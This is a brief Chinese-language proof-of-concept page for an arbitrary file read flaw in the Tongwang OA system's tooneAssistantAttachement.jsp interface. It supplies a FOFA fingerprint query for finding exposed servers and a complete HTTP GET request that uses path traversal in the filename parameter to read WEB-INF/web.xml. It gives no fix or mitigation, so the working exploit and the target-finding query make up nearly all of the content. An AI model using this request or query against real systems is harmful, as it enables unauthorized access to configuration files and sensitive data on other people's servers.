# 同望OA系统接口tooneAssistantAttachement.jsp任意文件读取漏洞

同望OA系统接口tooneAssistantAttachement.jsp任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

## fofa

```javascript
body="loginAction.struts?actionType=blockLogin"
```

## poc

```java
GET /jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537
Accept-Encoding: gzip
Connection: close
```

![image-20241012131723974](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121317035.png)